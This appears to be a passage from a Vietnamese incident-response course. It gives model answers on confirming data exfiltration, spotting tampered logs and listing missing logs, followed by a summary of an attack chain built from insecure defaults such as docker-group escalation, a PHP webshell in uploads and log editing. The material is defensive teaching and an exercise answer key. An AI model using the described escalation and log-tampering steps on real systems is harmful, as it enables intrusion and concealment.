<h3>Câu 12 — Dữ liệu có ra ngoài không?</h3>
<p><em>Cách làm:</em> Tìm phản hồi lớn gửi về IP kẻ tấn công, và xem sau đó URL ấy ra sao.</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 36)}
${lenh('s18/dieu-tra', 37)}
<p><strong>Đáp án.</strong> <strong>19:19:12Z GET /blog/wp-content/uploads/2026/11/kh.csv.gz → 200, 3 486 215 byte</strong> về 198.51.100.77 (curl); 19:21:40Z cùng URL → 404: nén trong thư mục web, tải về, rồi xoá. T1560.001, T1041, T1070.004. Nội dung: họ tên, email, số điện thoại, <strong>số hộ chiếu</strong>, ngày sinh của khách hàng.</p>
</details>
<h3>Câu 13 — Bản thân tour-api có bị khai thác không?</h3>
<p><em>Cách làm:</em> Bằng chứng âm tính: đếm mức log và cảnh báo, lỗi máy chủ, và kiểm khoảng thời gian log ứng dụng phủ.</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 38)}
${lenh('s18/dieu-tra', 39)}
<p><strong>Đáp án.</strong> Không có dấu hiệu: 98 cảnh báo = 40 lần chặn đầu vào (sqlmap) + 58 lần 409 (hết chỗ — nghiệp vụ); nginx 0 lỗi 5xx. Lưu ý: log ứng dụng chỉ bắt đầu từ 18/11 10:32Z — container bị tạo lại khi deploy và tệp json-file cũ mất theo.</p>
</details>
<h3>Câu 14 — Log lẽ ra phải có</h3>
<p><em>Cách làm:</em> Liệt kê những gì bạn muốn biết mà không chứng minh được.</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 40)}
<p><strong>Đáp án.</strong> Không có auditd (lệnh root chạy trong container), không lịch sử shell, không thân POST hay log PHP-FPM (lệnh qua webshell), không log DNS hay lưu lượng ra của vps01 (<code>u.sh</code> làm gì, bao nhiêu byte đi ra), không Docker events (tham số chính xác của <code>docker run</code>), không bản sao auth.log ngoài máy (sẽ sống sót qua <code>sed</code>), PostgreSQL chỉ ghi câu &gt; 1 giây, không có log ứng dụng trước 18/11.</p>
</details>

<h3>Câu 15 — Tác động và việc cần sửa</h3>
<p>Đây là cầu nối sang báo cáo (18.5): dữ liệu của ai, loại gì, nghĩa vụ pháp lý nào, sửa gì trước. Viết nháp ngay từ câu 11–14; đáp án mẫu nằm ở 18.5.</p>

<h3>🛡️ Góc hacker — chuỗi tấn công làm từ các mặc định</h3>
<p>Không có zero-day nào. Mỗi bước lợi dụng một mặc định hoặc một lối tắt phổ biến: đăng nhập SSH bằng mật khẩu bị một tệp cloud-init bật; tài khoản deploy nằm trong nhóm <code>docker</code> ("only trusted users should be allowed to control your Docker daemon" — tài liệu Docker); đường hầm VPN được vào cả LAN; <code>.env</code> ai cũng đọc được; PHP chạy được trong thư mục uploads; log chỉ nằm trên chính máy bị tấn công.</p>
${nguon('📘', 'Docker Docs — Docker Engine security', 'Bề mặt tấn công của Docker daemon: chỉ người tin cậy mới được điều khiển', 'https://docs.docker.com/engine/security/')}
${nguon('📘', 'MITRE ATT&CK — T1611 Escape to Host', 'Leo thang đặc quyền qua mount của container', 'https://attack.mitre.org/techniques/T1611/')}

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ul>
<li>"Làm sao bạn nối các lần hỏng trên Windows với máy chủ Linux?" — IP đường hầm từ cấu hình router + mã container rút gọn dùng làm workstation name của NTLM + thời điểm nằm trong vòng đời container.</li>
<li>"auth.log trông sạch. Sao biết nó bị sửa?" — so với journal hoặc bản tập trung, dòng mồ côi, nhịp tim (cron) bị đứt, thời điểm sinh/inode của tệp đổi.</li>
<li>"Vì sao ở trong nhóm <code>docker</code> là một lỗ hổng?" — daemon chạy bằng root và cho phép mount cả hệ thống tệp của máy.</li>
<li>"PostgreSQL ghi được lệnh COPY — lúc nào cũng vậy chứ?" — chỉ vì nó chạy &gt; 1 giây; nếu dump nhanh thì chỉ còn dòng kết nối. Với bảng nhạy cảm nên cân nhắc pgAudit (Chương 12).</li>
</ul>

<h3>Đi làm thật (outsourcing / OJT)</h3>
<p>Viết từng câu trả lời như thể luật sư của khách hàng sẽ đọc: bạn thấy gì, ở đâu, chắc tới mức nào. Tách sự thật (dòng log) khỏi diễn giải ("điều này khớp với…").</p>

<h3>🧪 Thực hành (2–3 giờ)</h3>
<ol>
<li>Tự trả lời câu 1–14 trước khi mở bất kỳ phần gập nào. Rồi so và chấm từng câu của bạn: đúng / đúng một phần / sai.</li>
<li>Tìm thêm một bằng chứng không có trong lời giải (gợi ý: kích thước phản hồi các POST tới cache.php, hoặc phần kết thúc phiên deploy trong journal).</li>
</ol>

<h3>🗂 Thuật ngữ</h3>
${kv([
  ['Xoay trục (pivot)', 'Dùng một giá trị tìm được ở nguồn này để tìm trong các nguồn khác.'],
  ['Dòng mồ côi', 'Dòng mà "bạn đồng hành" thường lệ bị mất — dấu hiệu xoá có chọn lọc.'],
  ['Nhịp tim (heartbeat)', 'Sự kiện đều đặn (cron, health check) mà khoảng trống của nó lộ ra log bị mất.'],
  ['Mã container rút gọn', '12 ký tự hex đầu của mã container; cũng là tên máy mặc định của nó.'],
  ['Timestomp', 'Sửa mốc thời gian của tệp để giấu lúc nó được tạo.'],
])}

<h3>📌 Tóm tắt</h3>
<ul>
<li>Bắt đầu từ tín hiệu, xoay trục theo từng dấu hiệu mới, ghi lại cả kết quả âm tính.</li>
<li>Log bị sửa sẽ tự tố cáo: so các bản, tìm dòng mồ côi và khoảng trống, kiểm siêu dữ liệu tệp.</li>
<li>Tiếp theo: 18.4 xếp tất cả lên một dòng thời gian UTC và gắn ATT&amp;CK.</li>
</ul>
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-14-4-xoa-dau-vet', title: 'Bài 14.4 — Phát hiện log bị xoá/sửa', sub: 'Dòng mồ côi, khoảng trống, bản tập trung', cta: 'Mở bài' })}
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-12-1-postgres-log', title: 'Bài 12.1 — Log PostgreSQL', sub: 'log_min_duration_statement, pgAudit', cta: 'Mở bài' })}
</div>
`,
};
